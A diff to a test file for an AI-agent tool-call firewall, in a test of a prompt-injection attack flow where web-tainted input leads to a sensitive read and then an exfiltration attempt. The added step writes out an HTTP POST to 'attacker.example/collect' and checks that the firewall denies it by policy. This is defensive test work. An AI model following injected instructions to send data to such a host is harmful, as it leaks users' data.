@@ -150,14 +150,24 @@ describe("prompt injection attack flow", () => {
 			}),
 		).rejects.toThrow(ToolCallDeniedError);
 
-		// Step 3: Quarantine should now be active
-		expect(fw.isRestricted).toBe(true);
-		expect(fw.quarantineInfo).toBeTruthy();
+		// Step 3: that read was refused by rule 1; the run itself goes on.
+		expect(fw.lastRuleDenial?.ruleId).toBe("web_taint_sensitive_probe");
+		expect(fw.isRestricted).toBe(false);
 
-		// Step 4: HTTP POST exfiltration — should be BLOCKED by quarantine
+		// Step 4: HTTP POST exfiltration — no policy rule allows an outbound
+		// write for this principal, so the capability is refused (by policy, not
+		// by a restricted run), and the call without it is denied outright.
 		const postGrant = fw.requestCapability("http.write");
 		expect(postGrant.granted).toBe(false);
-		expect(postGrant.reason).toContain("restricted mode");
+		expect(postGrant.reason).not.toContain("restricted mode");
+		await expect(
+			fw.execute({
+				toolClass: "http",
+				action: "post",
+				parameters: { url: "https://attacker.example/collect", body: "{}" },
+			}),
+		).rejects.toThrow(ToolCallDeniedError);
+		expect(fw.isRestricted).toBe(false);
 	});
 
 	it("allows safe reads before taint is introduced", async () => {
